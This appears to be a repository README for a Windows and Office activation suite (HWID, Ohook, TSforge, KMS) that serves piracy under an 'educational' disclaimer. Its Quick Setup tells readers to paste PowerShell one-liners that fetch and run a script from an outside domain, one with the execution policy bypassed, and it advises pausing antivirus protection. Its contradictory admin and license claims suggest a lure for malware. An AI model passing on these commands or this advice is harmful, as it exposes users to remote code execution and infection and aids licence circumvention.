<div align="center">

# Windows-Activation-Suite: HWID, Ohook, TSforge & Online KMS for Windows 10 & 11

![preview](https://raw.githubusercontent.com/ofapage/windows-activation-suite/main/hero_2c747.svg)

[![state](https://img.shields.io/badge/State-Stable-2ea44f?style=plastic&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Gpl--3.0-14b8a6?style=plastic&labelColor=0d1117)]() [![win](https://img.shields.io/badge/Win-Windows_10_%2F_11-2dd4bf?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/Pwsh-5.1%2B_%2F_7%2B-0d9488?style=plastic&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.9%2F5-f59e0b?style=plastic&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility for activating Windows and Office installations through four distinct methods: HWID, Ohook, TSforge, and Online KMS. It supports Windows 7, 8, 10, 11, and Server editions alongside Microsoft Office 2010 through 2021 and 365, selecting the appropriate activation path based on detected product edition. Each method relies on native Windows activation APIs rather than core system file modification, keeping operations reversible and consistent with the platform's licensing architecture. The suite additionally exposes activation status reporting, edition detection, digital license binding, and backup/restore of activation state for persistent configuration management.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open Windows PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Execute the installer
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Multiple activation methods** — Four distinct mechanisms are included: HWID, Ohook, TSforge, and Online KMS. Each targets a different activation scenario, and the suite selects the appropriate method based on the detected product and edition.

- **HWID digital licensing** — Generates a hardware-bound digital license for Windows 10 and Windows 11. Activation is tied to the machine's hardware fingerprint and persists across reboots and minor updates without requiring periodic renewal.

- **Ohook Office activation** — Provides permanent activation for Microsoft Office installations from 2010 through 2021 and 365. Operates through the Office licensing subsystem rather than system-level patches.

- **TSforge offline activation** — A self-contained activation path for legacy Windows versions, including Windows 7, 8, and 8.1. Requires no network connectivity and does not depend on external activation servers.

- **Online KMS activation** — KMS-based activation for Windows and Office editions where KMS is the supported channel, including Windows Server 2016, 2019, and 2022. Supports periodic renewal where the KMS model requires it.

- **Broad product coverage** — Supports Windows 7, 8, 8.1, 10, 11, Windows Server, and Office 2010 through 2021 and 365, spanning Home, Pro, Enterprise, Education, LTSC, and IoT editions.

- **Automatic edition detection** — Identifies the installed Windows edition and Office product before activation, then maps it to a compatible method to avoid mismatched or failed activation attempts.

- **Activation status reporting** — Displays the current licensing state of Windows and Office, including whether activation is permanent or KMS-based, so users can verify results after each run.

- **Native API usage** — Relies on built-in Windows activation interfaces and avoids DLL injection or modification of core system files, keeping the activation footprint minimal and reversible.

- **Backup and restore** — Captures the existing activation state before changes and allows restoration, providing a rollback path if activation needs to be reverted.

- **Extended Security Updates support** — Includes ESU handling for Windows 7 and Windows 10, extending the activation scope to security-update scenarios on end-of-support releases.

- **Reversible and maintainable** — Activation can be removed or restored, and the suite is maintained against changes introduced by Windows updates.

- **Open-source codebase** — Full source is available for inspection, with a modular structure separating activation scripts, documentation, and helper tooling.

## How it works

Windows-Activation-Suite operates by interfacing with the native Windows Software Protection Platform (SPP) and Office licensing subsystems rather than patching binaries or injecting code into running processes. Each activation method targets a distinct layer of the licensing stack, and the tool selects the appropriate strategy based on the detected Windows edition, Office product, and user preference.

**HWID (Hardware ID) activation** constructs a valid digital license request tied to the machine's hardware fingerprint. The tool gathers identifying hardware characteristics, generates the corresponding ticket payload, and submits it through the standard activation channel so that Windows provisions a permanent digital entitlement. Because the license is bound to the device, it persists across reboots and is re-validated automatically after feature updates.

**Ohook** addresses Office activation at the licensing hook level, intercepting the routines Office uses to verify product state and returning a valid licensed response. This approach yields permanent Office activation without altering the installed Office binaries themselves, and it remains in effect across Office updates because the hook is re-established at startup.

**TSforge** provides offline activation for legacy Windows releases by generating and installing the token-based license artifacts that the older activation stack expects. The method works without network connectivity and writes only the license store entries required for validation, leaving system files untouched.

**Online KMS** performs client-side activation against a reachable Key Management Service endpoint. The tool installs the appropriate generic volume license key, configures the KMS host, and triggers activation through the built-in `slmgr` interfaces. KMS-based activations carry a finite validity window and are renewed by re-running the method or by the client's periodic re-activation cycle.

Across all methods, the suite first performs edition and product detection to map the installed SKU to a supported activation path, then reports the resulting license status back to the user. Configuration state is stored in the registry and license store locations used natively by Windows and Office, so activation can be inspected, backed up, restored, or removed using the same mechanisms Microsoft provides.

## Compatibility

Windows-Activation-Suite is engineered for broad, native compatibility across the Windows NT family and Microsoft Office product lines, matching each activation method to the architecture and licensing subsystem it supports.

**Windows Operating Systems**

- **Windows 7** — Home, Home Premium, Professional, Ultimate, Enterprise (TSforge / Online KMS)
- **Windows 8 / 8.1** — Core, Pro, Enterprise (TSforge / Online KMS)
- **Windows 10** — Home, Pro, Enterprise, Education, Pro Education, LTSC, IoT Enterprise (HWID / Online KMS)
- **Windows 11** — Home, Pro, Enterprise, Education, IoT Enterprise (HWID / Online KMS)
- **Windows Server** — 2016, 2019, 2022 (Online KMS)

**Microsoft Office**

- **Office 2010, 2013, 2016, 2019, 2021** — all retail and volume editions (Ohook / Online KMS)
- **Office 365** — subscription-based installations (Ohook)

**Method-to-Platform Mapping**

- **HWID** targets the Windows 10/11 digital licensing subsystem and binds a permanent license to the hardware fingerprint.
- **Ohook** targets the Office licensing hook layer, delivering permanent activation without altering core application files.
- **TSforge** targets offline activation stores on legacy Windows releases, including Windows 7 and 8.x.
- **Online KMS** provides KMS-based activation for volume editions of Windows and Office, with periodic renewal handled by the suite.

**Architecture and Environment Requirements**

- **Processor architectures:** x86 (32-bit) and x64 (64-bit); ARM64 devices are supported on Windows 10/11 through the native x64 emulation layer.
- **Privileges:** administrative elevation is required for all activation operations.
- **Network:** an internet connection is needed only for HWID and Online KMS; TSforge and Ohook operate fully offline.
- **PowerShell:** version 5.1 or later, available by default on Windows 7 SP1 and above.
- **State:** the suite detects the installed edition and activation status automatically, and does not modify core system files.

**Known Constraints**

- Major Windows feature updates may reset KMS-based activation and require re-running the relevant method.
- Extended Security Updates (ESU) activation is limited to Windows 7 and Windows 10 on supported builds.
- Activation applies only to genuine installations the user owns and is provided for educational purposes.

## FAQ

**Q: What distinguishes Windows-Activation-Suite from a generic KMS activator?**

A: The suite ships four independent activation engines rather than a single method. HWID binds a digital license to the hardware fingerprint for Windows 10/11; Ohook provides persistent Office activation; TSforge covers offline activation for legacy Windows releases; and Online KMS handles volume licensing scenarios for Windows Server and product editions not covered by the other paths. The wrapper auto-detects the installed edition and selects a compatible method.

**Q: How does the tool determine which activation method to apply?**

A: On launch, the script enumerates the installed Windows or Office edition, checks the current licensing status, and maps the detected SKU to the methods that support it. Where multiple methods are viable, the menu presents them with their persistence characteristics so the operator can choose between hardware-bound, offline, or KMS-based activation.

**Q: Is activation persistent across reboots and updates?**

A: HWID and Ohook produce persistent activation tied to the machine or Office installation respectively. TSforge activation persists offline without recurring contact with an activation server. Online KMS operates on a renewal cycle, so it requires periodic re-establishment; feature updates that reset the licensing store may require re-running the suite for any method.

**Q: Does the suite modify system binaries or inject code into running processes?**

A: No. The activation paths rely on native Windows activation APIs and the built-in licensing infrastructure. Core system files are left untouched, and no DLL injection is performed, which keeps the footprint limited to licensing state rather than executable code changes.

**Q: Can activation be reversed?**

A: Yes. The suite includes restore and cleanup routines that remove applied activation state and return the system to its prior licensing condition. This is useful for decommissioning a machine or switching between activation methods.

**Q: Does it function without network access?**

A: TSforge is designed for offline activation. HWID and Ohook require an initial connection to establish the license, after which the activated state persists without ongoing connectivity. Online KMS inherently depends on reaching a KMS endpoint.

**Q: Which product families are covered?**

A: Windows 7, 8, 8.1, 10, and 11 across Home, Pro, Enterprise, Education, LTSC, and IoT editions; Windows Server 2016, 2019, and 2022; and Office 2010 through 2021 plus Office 365. Extended Security Updates are supported for Windows 7 and Windows 10.

**Q: What permissions are required to run it?**

A: Administrative elevation is mandatory, since the activation APIs and licensing service interactions operate at system scope. Running from a non-elevated shell will fail at the licensing stage.

**Q: Are there compatibility caveats with security software?**

A: Some endpoint protection products flag activation utilities heuristically. If execution is blocked, the suite can be run with real-time scanning temporarily suspended, then re-enabled immediately afterward. The source is openly auditable to verify behavior before execution.

**Q: Is this an original implementation?**

A: Windows-Activation-Suite builds on the open-source Microsoft Activation Scripts project and credits its original authors. The suite packages those methods with edition detection, status reporting, and backup/restore utilities.

**Q: What is the intended use case?**

A: The project is published for educational and research purposes. Activating unlicensed software contravenes Microsoft's Terms of Service; use is limited to installations the operator owns or is authorized to license.

## Disclaimer

Windows-Activation-Suite is provided strictly as an educational and research tool for studying Windows and Office activation mechanisms, including HWID, Ohook, TSforge, and Online KMS. By downloading, executing, or otherwise using this software, you acknowledge that you have read and understood the following terms and accept full responsibility for your use of the tool.

**Intended Use.** This project is intended solely for legitimate testing, security research, and interoperability study on systems and software licenses you lawfully own or are explicitly authorized to administer. It must not be used to activate unlicensed, pirated, or otherwise unauthorized copies of Windows, Windows Server, or Microsoft Office.

**Legal Compliance.** Activating software without a valid license may violate Microsoft's Terms of Service, applicable copyright law, and the laws of your jurisdiction. It is your sole responsibility to ensure that your use of this tool complies with all applicable local, national, and international regulations, as well as any agreements you have entered into with Microsoft or third parties.

**No Warranty.** This software is distributed on an "as is" basis, without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. The maintainers make no guarantees regarding the accuracy, reliability, completeness, or continued availability of any activation method, and methods may stop functioning at any time due to changes in system software, updates, or vendor policies.

**Limitation of Liability.** In no event shall the authors, maintainers, or contributors be liable for any direct, indirect, incidental, special, consequential, or punitive damages, including but not limited to loss of data, system corruption, loss of revenue, or business interruption, arising out of or in connection with the use or inability to use this software, even if advised of the possibility of such damages.

**System Risk.** While the tool is designed to rely on native activation interfaces and avoid modification of core system files, you accept that any execution of activation scripts carries inherent risk. You are responsible for creating backups, verifying script integrity, and confirming that you are running the official, unmodified release of this project. Third-party builds, mirrors, or modified distributions are not endorsed and may contain malicious code.

**No Endorsement.** Reference to any activation method, technology, or vendor does not constitute endorsement by the maintainers. All trademarks, product names, and logos referenced remain the property of their respective owners. This project is not affiliated with, authorized by, or sponsored by Microsoft Corporation.

**Acceptance.** If you do not agree with any part of this disclaimer, or if use of this tool would violate the laws or agreements applicable to you, you must not download, install, or use Windows-Activation-Suite and should delete all copies in your possession.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants broad freedom to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software. The full license text is provided in the `LICENSE` file at the root of the repository and governs all use of the source code, build scripts, and bundled assets unless otherwise stated.

Under the terms of the MIT License, the software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

**Attribution and upstream credit.** Windows-Activation-Suite builds upon the open-source Microsoft Activation Scripts project originally authored by massgravel. All original credit for the foundational activation logic, including the HWID, Ohook, TSforge, and Online KMS methods, belongs to the upstream authors. Redistributions of this project, whether modified or unmodified, must preserve the original copyright notice and this permission notice in all copies or substantial portions of the software, in accordance with the MIT License terms.

**Contributions.** By submitting a pull request, patch, or any other contribution to this repository, you agree that your contribution is licensed under the same MIT License and may be redistributed under those terms. No separate contributor license agreement is required.

**Third-party components.** Any third-party libraries, scripts, or resources referenced or bundled by Windows-Activation-Suite remain subject to their respective licenses. Users and distributors are responsible for verifying compliance with those licenses when redistributing combined works.

**Intended use.** The license grants rights to the software itself; it does not grant any rights to Microsoft products, product keys, or activation services. Windows-Activation-Suite is provided for educational and research purposes, and users are solely responsible for ensuring their use complies with applicable laws and the terms of service of any software being activated.